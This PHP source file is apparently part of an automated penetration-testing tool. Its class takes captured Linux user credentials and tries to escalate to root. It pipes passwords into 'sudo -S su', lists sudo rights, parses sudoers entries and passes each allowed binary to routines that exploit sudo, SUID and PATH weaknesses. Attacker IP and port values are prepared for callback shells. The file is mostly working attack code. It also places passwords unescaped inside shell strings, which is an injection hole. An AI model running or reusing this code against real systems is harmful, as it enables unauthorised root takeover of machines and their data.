<?php

class check4linux8users extends check4linux{

    var $uid_pass ;
    var $sudoers_str ;

    
    
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context,$uid_pass) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
        $this->uid_pass = trim($uid_pass);
        $this->sudoers_str = $this->users2sudoers2list($this->uid_name,$this->uid_pass);
        
    }
    

    
    
    
    
    public function users4root($user_name,$user_pass){
        $this->ssTitre(__FUNCTION__);
        $user_name = trim($user_name);
        $user_pass = trim($user_pass);
        $attacker_ip = $this->ip4addr4target($this->ip);
        $attacker_port = rand(1024,65535);
        //$attacker_port = 7777;
        $shell = "/bin/bash";
        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell $shell --command '%ID%' ";
        
        
        return $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
        
    }
    
    
    
    public function users2root(){
        $this->titre(__FUNCTION__);
        $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name))
                if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
                foreach ($this->tab_users_shell as $user2name_shell)
                    if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
        }
        $this->pause();
        
    }
    

  
  
    public function users(){
        $this->gtitre(__FUNCTION__);     
        if (!$this->ip2root8db($this->ip2id)) {$this->users2sudoers(); $this->pause();}
        if (!$this->ip2root8db($this->ip2id)) {$this->users2root(); $this->pause();}
               
    }
    

   
    
    
    public function users2sudoers(){
        $this->titre(__FUNCTION__);
        // [ -w /etc/sudoers ] && echo "writable" || echo "write permission denied"
        // margo ALL=(ALL) NOPASSWD: /bin/su
        
        if(!empty($this->sudoers_str)){
              if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath();
        }
        $this->pause();  
    }
    
    
    public function users2sudoers2list($user_name,$user_pass){
        $this->titre("Linux Privilege Escalation using Sudo Rights");
        $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
        $data = "echo '$user_pass' | sudo -S -l ";
        return $this->lan2stream4result($data,$this->stream_timeout*3);
        }
    

    

    
    
    public function users2sudoers8filepath(){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "echo '$this->sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_]{1,})+)\"  ";
        $list_apps = exec($data);
        $result .= $list_apps;
        $tab_apps = explode(",", $list_apps);
        $tab_apps = array_unique($tab_apps);
        sort($tab_apps,SORT_STRING);
        $this->article("App Sudoers", $this->tab($tab_apps));$this->pause();
        $size = count($tab_apps);
        for ($i=0;$i<$size;$i++){
            $app = $tab_apps[$i];
            $app = trim($app);
            if (!empty($app)) {

                $this->article("$i/$size", $app);
                if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($app, TRUE, $this->uid_pass);$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($app);$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($app);$this->pause();
            }
        }
        return $result;
    }
    
    

}
?>